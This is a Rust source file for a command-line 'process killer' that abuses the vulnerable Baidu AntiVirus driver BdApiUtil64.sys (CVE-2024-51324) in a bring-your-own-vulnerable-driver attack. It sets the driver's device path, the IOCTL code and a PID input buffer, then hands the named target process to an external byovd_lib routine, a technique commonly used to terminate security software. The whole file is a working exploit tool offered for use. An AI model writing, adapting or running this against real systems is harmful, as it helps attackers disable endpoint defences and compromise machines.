use byovd_lib::{DriverConfig, Result};
use clap::Parser;

// ============================================================================
// Driver Configuration - BdApiUtil64 (Baidu AntiVirus)
// CVE-2024-51324
// ============================================================================

struct BdApiUtilDriver;

impl DriverConfig for BdApiUtilDriver {
    fn driver_name(&self) -> &str {
        "BdApiUtil64"
    }

    fn driver_file(&self) -> &str {
        "BdApiUtil64.sys"
    }

    fn device_path(&self) -> &str {
        "\\\\.\\BdApiUtil"
    }

    fn ioctl_code(&self) -> u32 {
        0x800024B4
    }

    fn build_ioctl_input(&self, pid: u32, _process_name: &str) -> Vec<u8> {
        pid.to_ne_bytes().to_vec()
    }

    fn ioctl_output_size(&self) -> usize {
        4
    }
}

// ============================================================================
// CLI
// ============================================================================

#[derive(Parser)]
#[command(name = "BdApiUtil-Killer", version, author = "BlackSnufkin")]
#[command(about = "BYOVD process killer using BdApiUtil64 driver (CVE-2024-51324)")]
struct Cli {
    /// Target process name (e.g., notepad.exe)
    #[arg(short = 'n', long = "name", required = true)]
    process_name: String,
}

// ============================================================================
// Main
// ============================================================================

fn main() -> Result<()> {
    let cli = Cli::parse();
    byovd_lib::run(&BdApiUtilDriver, &cli.process_name, None)
}
